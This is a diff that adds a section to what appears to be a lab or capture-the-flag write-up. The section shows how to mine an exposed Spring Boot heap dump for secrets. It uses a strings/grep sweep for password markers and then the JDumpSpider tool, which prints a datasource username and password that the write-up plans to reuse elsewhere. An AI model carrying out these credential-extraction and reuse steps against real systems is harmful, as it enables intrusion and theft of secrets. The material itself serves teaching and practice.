@@ -391,6 +391,99 @@ stream.hprof: Java HPROF dump, created Sat Oct 17 15:09:10 2026
 ```
 
 Key finding: a valid 45 MB HPROF dump of the running gateway. Everything the application holds in memory, credentials included, is now available offline for mining.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 2.3 Recover credentials from the heap dump
+
+The dump holds the gateway's live objects. The goal is the datasource credentials. The first instinct, grepping for keywords, falls short and is worth showing, because it teaches why a heap needs an object-graph tool rather than text search.
+
+#### 2.3.1 First pass with strings (why keyword grep misses the secret)
+
+Run a text sweep for the obvious markers. This is the natural first move and it does surface useful context, so document what it gives and what it does not.
+
+**Command:** `strings stream.hprof | grep -iE 'jdbc:|password|username|hikari' | sort -u | head -40`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `strings stream.hprof` | Extract text | Pulls every printable run of characters out of the binary dump. |
+| `grep -iE 'jdbc:|password|username|hikari'` | Filter markers | Case-insensitively keeps lines mentioning a JDBC URL, the words password or username, or the Hikari pool. |
+| `sort -u` | Dedupe | Collapses identical lines so the list is readable. |
+| `head -40` | Trim | Shows only the first 40 lines. |
+
+**Result:**
+
+```shell
+8jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1
+8getPasswordBytes
+8keystorePassword
+8truststorePassword
+8validateUserPasswordHash
+$com/zaxxer/hikari/HikariConfigMXBean
+$Lcom/zaxxer/hikari/HikariDataSource;
+28000=Wrong user name or password
+```
+
+This recovers the JDBC URL (an H2 in-memory database named `terminaldb`, running in PostgreSQL-compatibility mode) but no username or password. The reason matters: in a heap dump the real credential values are standalone `String` objects with no `password=` label beside them, so a keyword grep matches Hikari class names and field labels and walks straight past the secret. To read a value you cannot name in advance, you must walk the object graph instead of searching text.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 2.3.2 Walk the object graph with JDumpSpider
+
+JDumpSpider parses an HPROF dump and reconstructs known credential-bearing objects (Hikari pools, Spring datasource properties, and similar), printing their fields directly. This reads the `username` and `password` the text search could not.
+
+**Command:**
+
+```bash
+wget -q https://github.com/whwlsfb/JDumpSpider/releases/latest/download/JDumpSpider-1.1-SNAPSHOT-full.jar -O JDumpSpider.jar
+java -jar JDumpSpider.jar stream.hprof
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `wget -q .../JDumpSpider...jar -O JDumpSpider.jar` | Fetch the tool | Downloads the heap-dump analyzer as a runnable jar. |
+| `java -jar JDumpSpider.jar stream.hprof` | Parse the dump | Runs the analyzer against the HPROF file and prints every object class it recognizes. |
+
+**Result:**
+
+```shell
+===========================================
+OriginTrackedMapPropertySource
+-------------
+server.address = 127.0.0.1
+management.endpoint.heapdump.access = unrestricted
+management.endpoints.access.default = none
+spring.application.name = terminal-gateway
+spring.jpa.hibernate.ddl-auto = create-drop
+
+===========================================
+UserPassSearcher
+-------------
+org.h2.engine.Database:
+[databaseName = mem:terminaldb, databaseShortName = TERMINALDB, databaseURL = jdbc:h2:mem:terminaldb]
+
+com.zaxxer.hikari.util.Credentials:
+[password = Yl4aCgh4y2PnU, username = svc_events]
+
+org.apache.catalina.startup.Tomcat:
+[hostname = localhost]
+```
+
+Key finding: the datasource credential `svc_events : Yl4aCgh4y2PnU`. The property dump also confirms the root cause, `management.endpoint.heapdump.access = unrestricted` while all other endpoints default to `none`, and names the app `terminal-gateway`. Because the heap database is an embedded in-memory H2 that is not network-reachable, this credential is a candidate for reuse against another service on the box.
+
 
 <div align="center">
 <br>
